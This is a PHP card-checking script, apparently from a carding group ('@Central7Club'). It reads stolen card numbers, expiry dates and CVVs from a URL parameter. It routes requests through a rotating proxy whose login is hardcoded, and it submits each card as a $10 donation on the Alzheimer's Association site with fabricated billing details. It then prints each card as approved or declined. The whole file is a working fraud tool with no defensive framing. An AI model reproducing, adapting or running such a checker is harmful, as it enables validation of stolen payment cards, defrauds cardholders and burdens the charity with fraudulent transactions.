<?php

error_reporting(0);
$lista = $_GET['lista'];
$cc = explode("|", $lista)[0];
$mes = explode("|", $lista)[1];
$ano = explode("|", $lista)[2];
$cvv = explode("|", $lista)[3];

function puxar($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


switch ($mes) {
    case '1': $mes = '01';
        break;
    case '4': $mes = '04';
        break;
    case '7': $mes = '07';
        break;
    case '2': $mes = '02';
        break;
    case '5': $mes = '05';
        break;
    case '8': $mes = '08';
        break;
    case '3': $mes = '03';
        break;
    case '6': $mes = '06';
        break;
    case '9': $mes = '09';
        break;

}
switch ($ano) {
         case '19':$ano = '2019';break;
         case '20':$ano = '2020';break;
         case '21':$ano = '2021';break;
         case '22':$ano = '2022';break;
         case '23':$ano = '2023';break;
         case '24':$ano = '2024';break;
         case '25':$ano = '2025';break;
         case '26':$ano = '2026';break;
         case '27':$ano = '2027';break;
         case '28':$ano = '2028';break;

}


if (file_exists(getcwd()."/cookies.txt")) {
        unlink(getcwd()."/cookies.txt");
    }



$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://act.alz.org/site/Donation2");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_PROXY, "http://p.webshare.io:80");
curl_setopt($ini, CURLOPT_PROXYUSERPWD, "xotyjlsh-rotate:vzfrfocr2zg2");
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Connection: keep-alive',
'Content-Type: application/x-www-form-urlencoded',
'Host: act.alz.org',
'Origin: https://act.alz.org',
'Referer: https://act.alz.org/site/Donation2?df_id=32112&32112.donation=form1',
'Sec-Fetch-Dest: document',
'Sec-Fetch-Mode: navigate',
'Sec-Fetch-Site: same-origin',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 OPR/73.0.3856.284'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, 'user_donation_amt=&company_min_matching_amt=&currency_locale=en_US&s_src=ANADE210002COM&gift_affiliation_input=&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpandedsubmit=true&level_standardexpanded=49177&level_standardexpanded49177amount=%2410&level_standardexpandedsubmit=true&level_standardsubmit=true&level_standardauto_repeatsubmit=true&level_standardauto_repeatnameV=false&tribute_show_honor_fieldssubmit=true&tribute_type=&tribute_typesubmit_skip=true&honoree_name_input=&honoree_namesubmit=true&tribute_notify_recip_namename=&tribute_notify_recip_namesubmit_skip=true&tribute_notify_recip_street1name=&tribute_notify_recip_street1submit_skip=true&tribute_notify_recip_street2name=&tribute_notify_recip_street2submit_skip=true&tribute_notify_recip_cityname=&tribute_notify_recip_citysubmit_skip=true&tribute_notify_recip_state=&tribute_notify_recip_statesubmit_skip=true&tribute_notify_recip_zipname=&tribute_notify_recip_zipsubmit_skip=true&tribute_notify_recip_country=United+States&tribute_notify_recip_countrysubmit_skip=true&tribute_message_bodyname=&tribute_message_bodysubmit_skip=true&tribute_message_closingname=&tribute_message_closingsubmit_skip=true&tribute_notify_recip_titlehidden=&responsive_payment_typepay_typeradio=credit&responsive_payment_typepay_typeradiosubmit=true&responsive_payment_typecc_typesubmit=true&responsive_payment_typecc_numbername='.$cc.'&responsive_payment_typecc_numbersubmit=true&responsive_payment_typecc_exp_date_MONTH='.$mes.'&responsive_payment_typecc_exp_date_YEAR='.$ano.'&responsive_payment_typecc_exp_date_DAY=1&responsive_payment_typecc_exp_datesubmit=true&responsive_payment_typecc_cvvname='.$cvv.'&responsive_payment_typecc_cvvsubmit=true&responsive_payment_typerouting_numbername=&responsive_payment_typerouting_numbersubmit=true&responsive_payment_typebank_accountname=&responsive_payment_typebank_accountsubmit=true&responsive_payment_typeverify_bank_accountname=&responsive_payment_typeverify_bank_accountsubmit=true&responsive_payment_type.account_typesubmit=true&responsive_payment_typeach_confirmsubmit=true&responsive_payment_typesubmit=true&billing_first_namename=Renato&billing_first_namesubmit=true&billing_last_namename=Garcia&billing_last_namesubmit=true&donor_email_addressname=temp4mail%40gmail.com&donor_email_addresssubmit=true&billing_addr_street1name=Salles+silva+amelia&billing_addr_street1submit=true&billing_addr_street2name=Salles+silva+amelia+2&billing_addr_street2submit=true&billing_addr_zipname=15550000&billing_addr_zipsubmit=true&billing_addr_cityname=Americo+de+Campos&billing_addr_citysubmit=true&billing_addr_state=None&billing_addr_statesubmit=true&billing_addr_country=Brazil&billing_addr_countrysubmit=true&donor_email_opt_inname=on&donor_email_opt_insubmit=true&box1062=on&checkbox_arraysubmit=true&connection_to_alzheimers_dropdown=I+prefer+not+to+answer.&connection_to_alzheimerssubmit=true&source_code_direct_entry_input=ANADE210002COM&source_code_direct_entrysubmit=true&gift_affiliation_dropdown=null&gift_affiliationsubmit=true&idb=229200353&df_id=32112&mfc_pref=T&32112.donation=form1&pstep_finish=Donate+Now&s_honoreeSendNotif=No');
  $exec = curl_exec($ini);
//$id_do_carai = puxar($exec, 'id": "', '"');

$retorno = puxar($exec, '<span class="field-error-text">','</span>');



if(strpos($exec, "The credit card was declined. Please check the information that you entered.")!== false){

    echo "<span class='label label-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv » Retorno: $retorno<br>";

}

elseif(strpos($exec, "There was a problem processing your request.")!== false){

    echo "<span class='label label-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv » Retorno: $retorno<br>";

}

else{

    echo "<span class='label label-success'>#Aprovada</span> ✔ $cc|$mes|$ano|$cvv » Retorno: Authorized donation, Thank you. » <span class='label label-info'>@Central7Club</span><br>";

}


?>